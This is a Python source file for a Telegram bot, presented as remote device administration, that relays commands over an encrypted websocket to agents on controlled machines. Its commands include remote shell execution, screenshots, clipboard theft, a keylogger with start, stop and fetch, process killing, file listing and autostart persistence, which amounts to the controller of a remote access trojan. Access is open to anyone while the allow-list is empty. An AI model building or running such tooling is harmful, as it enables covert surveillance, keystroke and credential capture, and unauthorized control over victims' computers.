"""
tg_bot.py — Telegram bot for remote device management.

Usage:
    python tg_bot.py --token BOT_TOKEN --server HOST --port 8765 --secret YOUR_SECRET

Or set environment variables:
    TG_BOT_TOKEN, SERVER_HOST, SERVER_PORT, SERVER_SECRET
"""

import argparse
import asyncio
import base64
import io
import json
import logging
import os
import sys
import time

import websockets
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from shared import CHUNK_SIZE, decrypt_msg, encrypt_msg, make_fernet

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("tg_bot")

ALLOWED_USERS = set()


def load_allowed_users():
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tg_allowed.json")
    if os.path.isfile(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
                return set(str(uid) for uid in data.get("allowed", []))
        except Exception:
            pass
    return set()


def save_allowed_users(users):
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tg_allowed.json")
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump({"allowed": list(users)}, f, indent=2)
    except Exception as e:
        log.error("Failed to save allowed users: %s", e)


def check_auth(update: Update) -> bool:
    if not ALLOWED_USERS:
        return True
    uid = str(update.effective_user.id)
    return uid in ALLOWED_USERS


class ServerConnection:
    def __init__(self, host, port, secret):
        self.host = host
        self.port = port
        self.secret = secret
        self.fernet = make_fernet(secret)
        self.ws = None
        self.connected = False
        self._pending = {}
        self._recv_task = None
        self._file_chunks = {}
        self._collecting_file = False

    async def connect(self):
        while True:
            try:
                uri = f"ws://{self.host}:{self.port}"
                log.info("Connecting to %s ...", uri)
                self.ws = await websockets.connect(uri, ping_interval=30, ping_timeout=10)
                await self._authenticate()
                self.connected = True
                self._recv_task = asyncio.create_task(self._recv_loop())
                log.info("Connected to server")
                return True
            except Exception as e:
                log.error("Connection failed: %s. Retry in 5s...", e)
                await asyncio.sleep(5)

    async def _authenticate(self):
        msg = {"type": "auth", "payload": {"token": self.secret}}
        await self.ws.send(encrypt_msg(self.fernet, msg))
        raw = await asyncio.wait_for(self.ws.recv(), timeout=10)
        resp = decrypt_msg(self.fernet, raw)
        if resp.get("type") != "auth_ok":
            raise Exception("Auth rejected")

    async def _recv_loop(self):
        try:
            async for raw in self.ws:
                if not raw:
                    continue
                try:
                    msg = decrypt_msg(self.fernet, raw)
                except Exception:
                    continue
                t = msg.get("type")

                if t == "file_data" and self._collecting_file:
                    self._collect_file_chunk(msg["payload"])
                    continue

                if t in self._pending:
                    fut = self._pending.pop(t)
                    if not fut.done():
                        fut.set_result(msg.get("payload", {}))
        except websockets.exceptions.ConnectionClosed:
            log.warning("Connection closed")
            self.connected = False
        except Exception as e:
            log.error("Recv error: %s", e)
            self.connected = False

    def _collect_file_chunk(self, payload):
        key = payload.get("filename", "file")
        if key not in self._file_chunks:
            self._file_chunks[key] = {"chunks": {}, "total": payload.get("total_chunks", 1)}
        self._file_chunks[key]["chunks"][payload["chunk_index"]] = payload["data_b64"]
        if len(self._file_chunks[key]["chunks"]) >= self._file_chunks[key]["total"]:
            full_b64 = "".join(
                self._file_chunks[key]["chunks"][i]["data_b64"]
                for i in range(self._file_chunks[key]["total"])
            )
            self._file_chunks[key]["data"] = base64.b64decode(full_b64)

    async def _send(self, msg_type, payload=None):
        if not self.ws or not self.connected:
            await self.connect()
        msg = {"type": msg_type, "payload": payload or {}}
        await self.ws.send(encrypt_msg(self.fernet, msg))

    async def _wait(self, msg_type, timeout=30):
        future = asyncio.get_event_loop().create_future()
        self._pending[msg_type] = future
        try:
            return await asyncio.wait_for(future, timeout=timeout)
        except asyncio.TimeoutError:
            self._pending.pop(msg_type, None)
            return None

    async def cmd(self, msg_type, payload=None, resp_type=None, timeout=30):
        await self._send(msg_type, payload)
        if resp_type:
            return await self._wait(resp_type, timeout=timeout)
        return None

    async def ping(self):
        t0 = time.monotonic()
        await self._send("ping")
        r = await self._wait("pong", timeout=5)
        if r is not None:
            return int((time.monotonic() - t0) * 1000)
        return None

    async def screenshot(self, quality=50):
        await self._send("screenshot", {"quality": quality})
        return await self._wait("screenshot_data", timeout=20)

    async def exec_cmd(self, command, timeout=60):
        await self._send("exec", {"command": command, "timeout": timeout})
        return await self._wait("exec_result", timeout=float(timeout) + 10)

    async def sysinfo(self):
        await self._send("sysinfo")
        return await self._wait("sysinfo", timeout=15)

    async def process_list(self):
        await self._send("process_list")
        return await self._wait("process_list", timeout=15)

    async def process_kill(self, pid=None, name=None):
        await self._send("process_kill", {"pid": pid, "name": name})
        return await self._wait("process_kill_result", timeout=10)

    async def clipboard_get(self):
        await self._send("clipboard_get")
        return await self._wait("clipboard_result", timeout=10)

    async def clipboard_set(self, text):
        await self._send("clipboard_set", {"text": text})
        return await self._wait("clipboard_result", timeout=10)

    async def keylog_start(self):
        await self._send("keylog_start")
        return await self._wait("keylog_status", timeout=10)

    async def keylog_stop(self):
        await self._send("keylog_stop")
        return await self._wait("keylog_status", timeout=10)

    async def keylog_get(self):
        await self._send("keylog_get")
        return await self._wait("keylog_data", timeout=10)

    async def heartbeat(self):
        await self._send("heartbeat")
        return await self._wait("heartbeat", timeout=10)

    async def update(self):
        await self._send("update")
        return "Update command sent"

    async def uninstall(self):
        await self._send("uninstall")
        return await self._wait("uninstall_result", timeout=15)

    async def fs_list(self, path="."):
        await self._send("fs_list", {"path": path})
        return await self._wait("fs_list", timeout=10)

    async def autostart_install(self, secret=None):
        await self._send("install_autostart", {"secret": secret or ""})
        return await self._wait("autostart_result", timeout=10)

    async def autostart_remove(self):
        await self._send("remove_autostart")
        return await self._wait("autostart_result", timeout=10)


conn: ServerConnection = None


async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_auth(update):
        await update.message.reply_text("Access denied. Ask admin to add your ID.")
        return
    uid = update.effective_user.id
    await update.message.reply_text(
        "Remote Admin Bot\n\n"
        f"Your ID: {uid}\n\n"
        "Commands:\n"
        "/ping - check connection\n"
        "/ss [quality] - screenshot\n"
        "/exec <cmd> - run command\n"
        "/sys - system info\n"
        "/ps - process list\n"
        "/kill <pid|name> - kill process\n"
        "/clip - clipboard\n"
        "/clipset <text> - set clipboard\n"
        "/keylog start|stop|get - keylogger\n"
        "/ls [path] - directory listing\n"
        "/hb - heartbeat\n"
        "/update - update from GitHub\n"
        "/autostart install|remove - autostart\n"
        "/auth <user_id> - allow user access\n"
    )


async def ping_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_auth(update):
        return
    ms = await conn.ping()
    if ms is not None:
        await update.message.reply_text(f"Pong: {ms}ms")
    else:
        await update.message.reply_text("Timeout")


async def ss_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_auth(update):
        return
    quality = 50
    if context.args:
        try:
            quality = int(context.args[0])
        except ValueError:
            pass
    data = await conn.screenshot(quality)
    if data and "image_b64" in data:
        img_bytes = base64.b64decode(data["image_b64"])
        await update.message.reply_photo(photo=io.BytesIO(img_bytes))
    else:
        await update.message.reply_text("Screenshot failed")


async def exec_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_auth(update):
        return
    if not context.args:
        await update.message.reply_text("Usage: /exec <command>")
        return
    command = " ".join(context.args)
    result = await conn.exec_cmd(command)
    if result:
        out = result.get("stdout", "")
        err = result.get("stderr", "")
        code = result.get("returncode", "?")
        text = out
        if err:
            text += f"\n[STDERR]\n{err}"
        text += f"\n[Exit: {code}]"
        if len(text) > 4000:
            text = text[:4000] + "\n...truncated"
        await update.message.reply_text(f"```\n{text}\n```", parse_mode="Markdown")
    else:
        await update.message.reply_text("Timeout")


async def sys_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_auth(update):
        return
    info = await conn.sysinfo()
    if info:
        lines = []
        for k, v in info.items():
            if k == "ip":
                continue
            lines.append(f"{k}: {v}")
        await update.message.reply_text("\n".join(lines))
    else:
        await update.message.reply_text("Timeout")


async def ps_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_auth(update):
        return
    data = await conn.process_list()
    procs = data.get("processes", []) if data else []
    if not procs:
        await update.message.reply_text("No processes")
        return
    lines = [f"{'PID':>7}  {'CPU%':>6}  {'MEM%':>6}  Name"]
    lines.append("-" * 50)
    for p in procs[:30]:
        lines.append(f"{p['pid']:>7}  {p['cpu']:>6.1f}  {p['mem']:>6.1f}  {p['name']}")
    await update.message.reply_text(f"```\n" + "\n".join(lines) + "\n```", parse_mode="Markdown")


async def kill_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_auth(update):
        return
    if not context.args:
        await update.message.reply_text("Usage: /kill <pid|name>")
        return
    target = context.args[0]
    if target.isdigit():
        result = await conn.process_kill(pid=int(target))
    else:
        result = await conn.process_kill(name=target)
    if result:
        ok = result.get("success", False)
        msg = result.get("message", "")
        await update.message.reply_text(f"{'OK' if ok else 'FAIL'}: {msg}")
    else:
        await update.message.reply_text("Timeout")


async def clip_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_auth(update):
        return
    result = await conn.clipboard_get()
    if result and result.get("success"):
        await update.message.reply_text(f"Clipboard:\n{result.get('text', '')}")
    else:
        await update.message.reply_text("Failed to get clipboard")


async def clipset_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_auth(update):
        return
    if not context.args:
        await update.message.reply_text("Usage: /clipset <text>")
        return
    text = " ".join(context.args)
    result = await conn.clipboard_set(text)
    if result and result.get("success"):
        await update.message.reply_text("Clipboard set")
    else:
        await update.message.reply_text("Failed")


async def keylog_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_auth(update):
        return
    if not context.args:
        await update.message.reply_text("Usage: /keylog start|stop|get")
        return
    action = context.args[0].lower()
    if action == "start":
        result = await conn.keylog_start()
        await update.message.reply_text(f"Keylog: {result.get('status', 'done')}")
    elif action == "stop":
        result = await conn.keylog_stop()
        await update.message.reply_text(f"Keylog: {result.get('status', 'done')}")
    elif action == "get":
        result = await conn.keylog_get()
        data = result.get("data", "")
        if data:
            if len(data) > 4000:
                data = data[:4000] + "..."
            await update.message.reply_text(f"Keylog:\n{data}")
        else:
            await update.message.reply_text("Keylog empty")
    else:
        await update.message.reply_text("Usage: /keylog start|stop|get")


async def ls_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_auth(update):
        return
    path = context.args[0] if context.args else "."
    result = await conn.fs_list(path)
    if result and "error" not in result:
        lines = [result.get("path", path)]
        entries = result.get("entries", [])
        for e in entries:
            if e.get("is_dir"):
                lines.append(f"  [DIR]  {e['name']}")
            else:
                sz = e.get("size", 0)
                if sz > 1024 * 1024:
                    sz_s = f"{sz / (1024 * 1024):.1f}MB"
                elif sz > 1024:
                    sz_s = f"{sz / 1024:.1f}KB"
                else:
                    sz_s = f"{sz}B"
                lines.append(f"         {e['name']:<30} {sz_s}")
        text = "\n".join(lines)
        if len(text) > 4000:
            text = text[:4000] + "\n..."
        await update.message.reply_text(f"```\n{text}\n```", parse_mode="Markdown")
    else:
        await update.message.reply_text(result.get("error", "Failed") if result else "Timeout")


async def hb_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_auth(update):
        return
    info = await conn.heartbeat()
    if info:
        lines = []
        if "hostname" in info:
            lines.append(f"Host: {info['hostname']}")
        if "os" in info:
            lines.append(f"OS: {info['os']}")
        if "cpu_percent" in info:
            lines.append(f"CPU: {info['cpu_percent']}%")
        if "ram_percent" in info:
            lines.append(f"RAM: {info.get('ram_used_gb', '?')}/{info.get('ram_total_gb', '?')} GB ({info['ram_percent']}%)")
        await update.message.reply_text("\n".join(lines))
    else:
        await update.message.reply_text("Timeout")


async def update_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_auth(update):
        return
    result = await conn.update()
    await update.message.reply_text(str(result))


async def autostart_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_auth(update):
        return
    if not context.args:
        await update.message.reply_text("Usage: /autostart install|remove")
        return
    action = context.args[0].lower()
    if action == "install":
        result = await conn.autostart_install()
        await update.message.reply_text(str(result))
    elif action == "remove":
        result = await conn.autostart_remove()
        await update.message.reply_text(str(result))
    else:
        await update.message.reply_text("Usage: /autostart install|remove")


async def auth_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if ALLOWED_USERS and uid not in ALLOWED_USERS:
        await update.message.reply_text("Access denied")
        return
    if not context.args:
        await update.message.reply_text(f"Your ID: {uid}\nUsage: /auth <user_id>")
        return
    new_uid = context.args[0]
    ALLOWED_USERS.add(new_uid)
    save_allowed_users(ALLOWED_USERS)
    await update.message.reply_text(f"Allowed user: {new_uid}")


async def post_init(application: Application):
    await conn.connect()
    log.info("Bot connected to server")


def main():
    global conn, ALLOWED_USERS

    parser = argparse.ArgumentParser(description="Telegram bot for remote admin")
    parser.add_argument("--token", required=False, help="Telegram bot token")
    parser.add_argument("--server", required=False, help="Server host")
    parser.add_argument("--port", type=int, default=8765, help="Server port")
    parser.add_argument("--secret", required=False, help="Server secret")
    args = parser.parse_args()

    token = args.token or os.environ.get("TG_BOT_TOKEN")
    host = args.server or os.environ.get("SERVER_HOST", "127.0.0.1")
    port = args.port or int(os.environ.get("SERVER_PORT", "8765"))
    secret = args.secret or os.environ.get("SERVER_SECRET")

    if not token:
        print("Error: --token or TG_BOT_TOKEN env required")
        sys.exit(1)
    if not secret:
        print("Error: --secret or SERVER_SECRET env required")
        sys.exit(1)

    ALLOWED_USERS = load_allowed_users()

    conn = ServerConnection(host, port, secret)

    app = Application.builder().token(token).post_init(post_init).build()

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("ping", ping_cmd))
    app.add_handler(CommandHandler("ss", ss_cmd))
    app.add_handler(CommandHandler("exec", exec_cmd))
    app.add_handler(CommandHandler("sys", sys_cmd))
    app.add_handler(CommandHandler("ps", ps_cmd))
    app.add_handler(CommandHandler("kill", kill_cmd))
    app.add_handler(CommandHandler("clip", clip_cmd))
    app.add_handler(CommandHandler("clipset", clipset_cmd))
    app.add_handler(CommandHandler("keylog", keylog_cmd))
    app.add_handler(CommandHandler("ls", ls_cmd))
    app.add_handler(CommandHandler("hb", hb_cmd))
    app.add_handler(CommandHandler("update", update_cmd))
    app.add_handler(CommandHandler("autostart", autostart_cmd))
    app.add_handler(CommandHandler("auth", auth_cmd))

    log.info("Starting Telegram bot...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
